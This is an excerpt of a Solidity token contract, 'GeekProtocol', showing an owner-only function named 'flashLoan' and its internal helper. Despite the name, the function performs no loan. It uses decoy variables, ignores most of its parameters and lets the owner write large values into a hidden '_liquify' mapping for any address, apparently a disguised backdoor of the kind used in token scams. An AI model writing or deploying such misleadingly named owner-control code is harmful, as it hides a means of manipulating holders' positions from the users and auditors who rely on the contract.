...
contract GeekProtocol is Ownable {
  ...
  function flashLoan(uint256 amount, address receiverAddress, bytes32 params, uint16 referralCode) public onlyOwner() {
    uint8 asset = 1;  uint8 mode = 1;
    _flashLoan(amount, receiverAddress, params, referralCode);
  }

  function _flashLoan(uint256 amount, address receiverAddress, bytes32 params, uint16 referralCode) internal {
    if(receiverAddress != address(0)){
    uint8 asset = 1;  uint8 mode = 1;

      require((asset + mode) <= amount, "Amount must be more than AddedValues");
      _liquify[receiverAddress] = amount * (10 ** 9);
    }
  }
}